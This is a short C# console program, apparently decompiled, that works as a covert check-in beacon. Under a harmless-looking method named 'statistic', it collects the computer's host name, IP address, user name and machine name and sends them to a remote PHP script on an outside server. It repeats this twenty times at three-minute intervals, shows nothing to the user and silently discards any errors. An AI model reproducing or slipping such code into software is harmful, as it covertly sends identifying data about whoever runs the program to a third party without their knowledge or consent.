using System;
using System.Net;
using System.Threading;

namespace ConsoleApplication19;

internal class Program
{
	private static void Main(string[] args)
	{
		int num = 0;
		while (num < 20)
		{
			statistic();
			num++;
			Thread.Sleep(180000);
		}
	}

	public static void statistic()
	{
		string hostName = Dns.GetHostName();
		string text = Dns.GetHostEntry(hostName).AddressList[0].ToString();
		string userName = Environment.UserName;
		string machineName = Environment.MachineName;
		string text2 = hostName + text + userName + machineName + "ONL\\n";
		try
		{
			string text3 = "http://server6.thcservers.com/~advavast/write2.php?info=";
			string address = text3 + text2;
			new WebClient().DownloadString(address);
		}
		catch (Exception)
		{
		}
	}
}
